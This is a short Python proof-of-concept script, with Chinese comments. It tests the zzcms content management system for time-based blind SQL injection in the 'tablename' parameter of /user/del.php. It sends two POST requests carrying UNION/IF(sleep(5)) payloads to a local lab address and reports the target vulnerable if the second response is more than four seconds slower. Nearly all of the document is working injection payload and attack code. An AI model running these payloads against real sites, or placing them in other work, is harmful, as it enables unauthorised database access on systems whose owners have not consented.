#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib3
from mycurl import *
import time

def scan_url(url):
    target = url + '/user/del.php'
    #正常的访问
    payload1 = 'id=1&tablename=zzcms_answer where id=999999999 union select 1,2 and if(1=2,sleep(5),1)%23'
  #带有延时的访问
    payload2 = "id=1&tablename=zzcms_answer where id=999999999 union select 1,2 and if(1=1,sleep(5),1)%23"
    start_time = time.time()
    code, head, body, errcode, redirect_url = curl.request(target, method='POST', data=payload1,headers={'Content-Type': 'application/x-www-form-urlencoded'})
    #正常访问时间1
    end_time_1 = time.time()
 
    code, head, body, errcode, redirect_url = curl.request(target, method='POST', data=payload2 ,headers={'Content-Type': 'application/x-www-form-urlencoded'})
       #延时访问时间
    end_time_2 = time.time()
    time1 = end_time_1 - start_time
    time2 = end_time_2 - end_time_1

    
    if (time2 - time1) > 4:
        return True
    else:
        return False


if __name__ == '__main__':
    res = scan_url("http://192.168.179.134")
    print(res)
